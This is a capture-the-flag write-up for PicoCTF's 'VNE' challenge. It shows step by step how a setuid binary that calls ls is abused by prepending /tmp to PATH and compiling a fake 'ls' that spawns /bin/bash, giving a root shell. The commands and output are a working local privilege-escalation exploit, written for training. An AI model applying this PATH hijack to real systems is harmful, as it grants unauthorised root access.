---
title: "PicoCTF 2023 Binary Exploitation: VNE"
description: "Writeup for VNE from PicoCTF 2023"
slug: "picoctf-vne"
date: "2022-03-06 00:00:00+0000"
image: "cover.jpg"
categories:
    - "CTF"
tags:
weight: 1
---

```
📁Category: Binary Exploitation
📄Files: N/A
💻 Server Connections: Yes
🏷️Tags: bash, env, injection

📃Description: We've got a binary that can list directories as root, try it out !!
Additional details will be available after launching your challenge instance.

1️⃣Hint 1: Have you checked the contents of the /root folder?
2️⃣Hint 2: Find a way to add more instruction to ls
```

### Takeaways from hints, description, and tags: 
* Something important is in the /root file (the flag)
* We will have to use environment variables
* The binary lists contents of a directory as root
* We need to inject code into “ls”

## Phase 1: Recon 🔍
It is important to get familiar with the machine we log into so that we can find important assets such as possible vulnerabilities, which we may be able to exploit to get us root access.

### What do we notice? 
* A binary that lists a directory as root
* Why this is important: It does it as root via an SUID bit, because the root user made the executable
* How it works: It takes the input for the directory as an environment variable
* Other important takeaways: If it is listing the contents of a directory, it is most probably doing something with the ls binary

```
ctf-player@pico-chall$ ls
bin
ctf-player@pico-chall$ file bin
bin: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l d-linux-x86-64.so.2, BuildID[shal]=202cb71538089bb22aa22d5d3f8f77a8a94a826f, for GNU/Linux 3.2.0, not stripp 
ctf-player@pico-chall$ ls -l
ed
total 20
-rwsr-xr-x 1 root root 18752 Aug 4 2023 bin
ctf-player@pico-chall$
```

> SUID, short for Set User ID, is a special permission that can be assigned to executable files. When an executable file has the SUID permission enabled, it allows users who execute the file to temporarily assume the privileges of the file's owner.

## Phase 2: Constructing a Plan 🛠️
Using the information we have gathered, we can try to assess vulnerabilities on our target system. So far, we have thought of environment variable injection, but now it is time for us to plot out this plan.

### The Plan 
We make our own ls binary that spawns a shell. Since the file has an SUID, this will give us a root shell if the binary we are manipulating uses ls (in which according to the hints, it does).

There are however, some rather huge obstacles


> Q1: How would we execute this plan so that the binary we are manipulating thinks our ls binary is the real ls binary?

> A1: We could exploit the `PATH` environment variable. Many hints and tags tell us that the exploit has something to do
with environment variables and the ls executable which the SUID binary is most likely using for its operations.



> Q2: What directory should we put our binary into?

> A2: The answer is /tmp. A directory with read, write, and execute permissions for everyone. This is perfect as it will
be the perfect soil to plant our C code in.

### The Theory: 
When "ls" is typed into the command line, the system looks through path for an executable with the name "ls". So in our injected PATH, because `/tmp` is first, when the binary which runs ls as root runs "ls" as root it wil run our binary as root which will run /bin/bash root.

![image](https://github.com/shuban-789/PicoPwnbooks-BinaryExploitation/assets/67974101/9525b700-e39d-4ec6-a2b6-62fe0edec152)


## Phase 3: Execution 🧀
First, let's log onto our machine. To logon, we will need to use ssh with the command format of: 

`ssh -p <port> <user>@<ip>`

After logging on, let’s list our environment variables, and try editing the PATH.

```
ctf-player@pico-chall$ env SHELL=/bin/bash
PWD=/home/ctf-player
LOGNAME=ctf-player
MOTD_SHOWN=pam
HOME=/home/ctf-player
LANG=C.UTF-8
SSH_CONNECTION=127.0.0.1 55826 127.0.0.1 22
TERM=xterm-256color
USER=ctf-player
SHLVL=1
PS1=\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ SSH_CLIENT=127.0.0.1 55826 22
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
SSH_TTY=/dev/pts/0
_=/usr/bin/env
ctf-player@pico-chall$ export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/ga
mes:/usr/local/games:/snap/bin
ctf-player@pico-chall$ env
SHELL=/bin/bash
PWD=/home/ctf-player
LOGNAME=ctf-player
MOTD_SHOWN=pam
HOME=/home/ctf-player
LANG=C.UTF-8
SSH_CONNECTION=127.0.0.1 55826 127.0.0.1 22
TERM=xterm-256color
USER=ctf-player
SHLVL=1
PS1=\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ SSH_CLIENT=127.0.0.1 55826 22
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
SSH_TTY=/dev/pts/0
_=/usr/bin/env
ctf-player@pico-chall$
```

It looks like the injection worked, so we can move on to making our fake ls executable.

Finally, we need to make our fake ls binary containing this C code:

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
  system("/bin/bash");
}
```

<br>

```
ctf-player@pico-chall$ touch ls.c
ctf-player@pico-chall$ echo "#include <stdio.h>" >> ls.c
ctf-player@pico-chall$ echo "#include <stdlib.h>" >> ls.c
ctf-player@pico-chall$ echo "int main()" >> ls.c
ctf-player@pico-chall$ echo "{" >> ls.c
ctf-player@pico-chall$ echo " system(\"/bin/bash\");" >> ls.c 
ctf-player@pico-chall$ echo "}" >> ls.c
ctf-player@pico-chall$ cc ls.c -o ls
```

Lets execute!

```
ctf-player@pico-chall$ ./bin
Listing the content of /root as root:
root@challenge:/# cd /root
root@challenge: /root# cat flag.txt
picoCTF{try_to_pwn_VNE_on_your_own}root@challenge: /root# exit
```

### Disclaimer
The flag obtained in the command sequence example is obviously an edited version of the real flag. I highly reccomend you to try to solve the VNE problem and obtain its flag on your own.
